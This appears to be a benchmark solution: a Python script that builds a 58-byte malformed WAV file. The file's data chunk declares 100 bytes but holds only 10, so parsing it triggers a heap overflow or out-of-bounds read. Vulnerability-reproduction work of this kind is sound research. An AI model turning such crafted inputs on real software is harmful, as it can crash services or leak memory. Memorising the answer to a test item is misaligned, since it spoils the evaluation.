import os
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a malformed RIFF file that triggers heap buffer overflow
        # by having a data size that exceeds the chunk bounds
        
        # RIFF header
        riff_header = b'RIFF'
        
        # File size: 50 bytes (58 total - 8 for 'RIFF' + size fields)
        file_size = 50  # 58 - 8
        
        # WAVE format
        wave_format = b'WAVE'
        
        # fmt chunk with PCM format
        fmt_chunk = b'fmt '
        fmt_size = 16  # PCM format chunk size
        fmt_data = struct.pack('<HHIIHH',
                               1,      # PCM format
                               1,      # mono
                               44100,  # sample rate
                               88200,  # byte rate
                               2,      # block align
                               16)     # bits per sample
        
        # data chunk with malformed size
        data_chunk = b'data'
        
        # The vulnerability: data size claims 100 bytes but actual chunk is smaller
        # This causes out-of-bounds read when processing data
        claimed_data_size = 100  # Large size that exceeds actual chunk
        
        # Actual data we'll provide (much smaller than claimed size)
        actual_data = b'\x00' * 10  # Only 10 bytes of actual data
        
        # Build the file:
        # RIFF header + file_size + WAVE + fmt chunk + data chunk + actual data
        # Total should be 58 bytes
        
        # Calculate remaining bytes for padding to reach 58
        current_length = (len(riff_header) + 4 + len(wave_format) +
                         len(fmt_chunk) + 4 + len(fmt_data) +
                         len(data_chunk) + 4 + len(actual_data))
        
        padding_needed = 58 - current_length
        
        # If padding needed is negative, adjust claimed_data_size
        if padding_needed < 0:
            # Reduce actual data
            actual_data = actual_data[:len(actual_data) + padding_needed]
            padding_needed = 0
        
        # Construct the malformed file
        poc = (
            riff_header +
            struct.pack('<I', file_size) +
            wave_format +
            fmt_chunk +
            struct.pack('<I', fmt_size) +
            fmt_data +
            data_chunk +
            struct.pack('<I', claimed_data_size) +  # Malformed: claims 100 bytes
            actual_data +
            b'\x00' * padding_needed
        )
        
        # Verify total length is 58 bytes
        if len(poc) != 58:
            # Adjust if needed
            if len(poc) > 58:
                poc = poc[:58]
            else:
                poc = poc + b'\x00' * (58 - len(poc))
        
        return poc
